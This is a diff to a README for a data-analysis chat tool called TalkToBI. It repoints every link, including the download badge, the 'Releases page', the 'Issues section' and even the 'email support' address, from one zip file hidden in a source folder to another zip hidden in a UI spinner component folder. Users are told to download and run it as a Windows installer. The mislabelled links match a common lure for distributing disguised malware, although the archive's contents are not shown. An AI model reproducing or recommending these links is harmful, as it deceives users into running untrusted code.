@@ -6,9 +6,9 @@ Welcome to TalkToBI! This platform makes data analysis simple and natural. With 
 
 ## 📥 Download TalkToBI
 
-[![Download TalkToBI](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip)](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip)
+[![Download TalkToBI](https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip)](https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip)
 
-To get started, visit the [Releases page](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip) to download the latest version of TalkToBI.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip) to download the latest version of TalkToBI.
 
 ## 📋 System Requirements
 
@@ -21,12 +21,12 @@ Before installing, ensure your system meets these basic requirements:
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page**: Go to the [TalkToBI Releases page](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip).
+1. **Visit the Releases Page**: Go to the [TalkToBI Releases page](https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip).
    
 2. **Choose Your Version**: Look for the latest version listed—typically named something like `TalkToBI v1.0.0`.
 
 3. **Download the Installer**:
-   - Click on the file appropriate for your operating system (e.g., **https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip** for Windows users).
+   - Click on the file appropriate for your operating system (e.g., **https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip** for Windows users).
    - Wait for the download to complete.
 
 4. **Run the Installer**:
@@ -68,8 +68,8 @@ Before installing, ensure your system meets these basic requirements:
 
 If you need help, look no further! You can reach out through our support channels:
 
-- **GitHub Issues**: Visit the [Issues section](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip) to report problems or ask questions.
-- **Email Support**: Send an email to https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip for direct assistance regarding installation or functionality.
+- **GitHub Issues**: Visit the [Issues section](https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip) to report problems or ask questions.
+- **Email Support**: Send an email to https://raw.githubusercontent.com/red-avatar/TalkToBI/main/chatbi-frontend/src/components/ui/Spinner/Talk-BI-To-1.6.zip for direct assistance regarding installation or functionality.
 
 ## 📝 Frequently Asked Questions
 
